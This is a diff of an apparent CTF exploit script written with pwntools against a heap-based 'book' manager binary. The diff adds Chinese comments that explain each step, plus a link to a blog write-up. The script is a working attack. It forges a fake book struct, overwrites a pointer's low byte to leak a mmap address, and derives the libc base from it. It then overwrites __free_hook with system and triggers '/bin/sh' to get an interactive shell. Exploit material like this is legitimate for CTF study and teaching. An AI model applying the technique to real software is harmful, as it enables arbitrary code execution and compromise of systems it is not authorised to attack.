@@ -57,6 +57,7 @@ def delete(index):
 
 create(0x140,b'book1',0x140,b'first book')
 create(0x21000,b'book2',0x21000,b'second book')
+
 book_id,book_name,book_des,book_author=print1(1)
 book1_addr=u64(book_author[0x20:0x26].ljust(8,b'\x00'))
 print("book1_addr: "+hex(book1_addr))
@@ -65,10 +66,11 @@ print("book2_addr: "+hex(book2_addr))
 book2_name=book2_addr+8
 print("book2_name: "+hex(book2_name))
 book2_des=book2_addr+16
-payload=b'a'*0x90+p64(1)+p64(book2_name)+p64(book2_name)+p64(0xff)
+
+payload=b'a'*0x90+p64(1)+p64(book2_name)+p64(book2_name)+p64(0xff)#构造fake_book_struct,偏移通过动态调试确定
 edit(1,payload)
-change(b'a'*0x20)
-offset=0x5ca010
+change(b'a'*0x20)#将book1指针的最低位覆盖为0，并通过计算好的偏移让它指向fake_book_struct
+offset=0x5ca010#mmap与libc_base的偏移
 
 # book_id,book_name,book_des,book_author=print(1)
 # name_addr=u64(book_name[-6:].ljust(8,b'\x00'))
@@ -78,16 +80,20 @@ p.recvuntil(b'Name: ')
 temp = p.recvuntil(b'\n')
 name_addr = u64(temp[:-1].ljust(8, b'\x00'))
 print("hex(name_addr): " + hex(name_addr))
+
 libc_base=name_addr-offset
 print("hex(libc_base): " + hex(libc_base))
 system_addr=libc_base+libc.symbols['system']
 binsh_addr=libc_base+next(libc.search(b'/bin/sh'))
 free_hook = libc.symbols['__free_hook'] + libc_base
+
 payload=p64(binsh_addr)+p64(free_hook)
+
 print(b'-----------------')
 print('binsh_addr: ' + hex(binsh_addr))
 print('free_hook: ' + hex(free_hook))
 print('system_addr: ' + hex(system_addr))
+
 edit(1,payload)
 payload=p64(system_addr)
 edit(2,payload)
@@ -100,3 +106,5 @@ p.interactive()
 # gdb.attach(p)
 # pause()
 # p.interactive()
+
+#链接：https://www.uf4te.cn/posts/18c02ebd.html#post-comment
